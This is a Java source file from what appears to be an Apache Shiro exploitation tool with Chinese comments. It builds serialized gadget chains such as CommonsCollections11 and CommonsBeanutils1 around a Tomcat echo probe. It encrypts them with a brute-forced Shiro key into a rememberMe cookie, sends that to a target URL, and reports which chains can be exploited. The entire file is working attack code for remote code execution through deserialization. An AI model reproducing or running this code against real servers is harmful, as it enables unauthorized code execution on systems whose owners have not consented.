package core;

import common.HttpUtils;
import common.PayloadEncrypt;
import entity.ControllersFactory;
import payloads.CommonsBeanutils1;
import payloads.CommonsBeanutils1_183;
import payloads.CommonsCollections11;
import payloads.CommonsCollectionsK1;
import payloads.check.TomcatGadgetCheck;
import payloads.util.Reflections;
import payloads.util.Serializer;
import ui.MyController;

import java.util.List;
import java.util.Map;

public class GadgetCheck {
    final private MyController myController = (MyController) ControllersFactory.controllers.get(MyController.class.getSimpleName());
    final private Map<String,String> paramContext = ControllersFactory.paramsContext;
    final private Map<String,byte[]> loaderByte = ControllersFactory.loaderByte;
    private HttpUtils httpUtils = new HttpUtils();


    public boolean tomcatCheckGadget(String method,String gadget) throws Exception {
        // 对应链的探测的字节码 这里都是 tomcat 的利用链
        loaderByte.put("CommonsCollections11", Serializer.serialize(new CommonsCollections11().getObject(TomcatGadgetCheck.gadgetCheck())));
        loaderByte.put("CommonsBeanutils1", Serializer.serialize(new CommonsBeanutils1().getObject(TomcatGadgetCheck.gadgetCheck())));
        loaderByte.put("CommonsBeanutils1_183", Serializer.serialize(new CommonsBeanutils1_183().getObject(TomcatGadgetCheck.gadgetCheck())));
        loaderByte.put("CommonsCollectionsK1", Serializer.serialize(new CommonsCollectionsK1().getObject(TomcatGadgetCheck.gadgetCheck())));
        // 获取爆破成功的 shiro key
        String k = paramContext.get("ShiroKey");
        if (k != null){
            Map<String, List<String>> header = null;
            List<String> echo = null;
            String checkCookie = null;
            // 按钮选中的对应的利用链
            byte[] bytes = loaderByte.get(gadget);
            // 获取加密方式
            String encryptType = this.paramContext.get("Encrypt");
            // payload 进行加密生成
            if (encryptType.equals("CBC")){
                checkCookie = paramContext.get("rememberMe") + "=" + PayloadEncrypt.AesCbcEncrypt(bytes,k);
            } else{
                checkCookie = paramContext.get("rememberMe") + "=" + PayloadEncrypt.AesGcmEncrypt(bytes,k);
            }

            String url = paramContext.get("URL");
            if (paramContext.get("OutputType").equals("1")){
                this.myController.result.appendText("\nPayload输出模式:");
                this.myController.result.appendText("\nCookie: " + checkCookie + "\n\n");
            }

            if (method.equals("GET")){
                header = this.httpUtils.sendGetRequest(url,checkCookie);
            } else {
                header = this.httpUtils.sendPostRequest(url,checkCookie,null);
            }

            if (header != null){
                echo = header.get("echo");
                if (echo == null){
                    echo = header.get("Echo");
                }
                if (echo != null && echo.toString().contains("success")){
                    this.myController.result.appendText("[+] " +gadget+ "可利用!\n");
                    return true;
                }else {
                    this.myController.result.appendText("[!] " +gadget+ "不可用!\n");
                    return false;
                }
            }
        }
        this.myController.result.appendText("[!] 请先输入key或爆破key\n");
        return false;
    }
}
